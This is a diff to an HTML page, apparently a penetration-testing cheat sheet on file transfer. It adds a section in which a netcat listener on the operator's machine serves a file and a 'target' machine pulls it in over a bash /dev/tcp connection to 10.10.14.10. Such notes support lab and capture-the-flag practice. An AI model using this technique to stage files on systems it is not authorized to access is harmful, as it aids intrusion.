@@ -72,6 +72,18 @@
 </span></span><span class="line"><span class="cl">scp -i id_rsa /tmp/local/file user@10.10.11.10:/tmp/remote/file
 </span></span></code></pre></div><br>
 <hr>
+<h3 id="pipe">pipe</h3>
+<h4 id="local-to-remote-1">Local to Remote</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In our local Linux machine</span>
+</span></span><span class="line"><span class="cl">cat filename <span class="p">|</span> nc -lnvp <span class="m">4444</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In target Linux machine</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 3&lt;&gt;/dev/tcp/10.10.14.10/4444
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Ctrl+C to interrupt after some time</span>
+</span></span><span class="line"><span class="cl">cat &lt;<span class="p">&amp;</span><span class="m">3</span> &gt; filename
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
+</span></span><span class="line"><span class="cl">md5sum filename
+</span></span></code></pre></div><br>
+<hr>
 <h3 id="base64-encoding-for-small-binary">Base64 Encoding (for small binary)</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Base64 encode binary</span>
 </span></span><span class="line"><span class="cl">cat file.elf <span class="p">|</span> base64 -w0
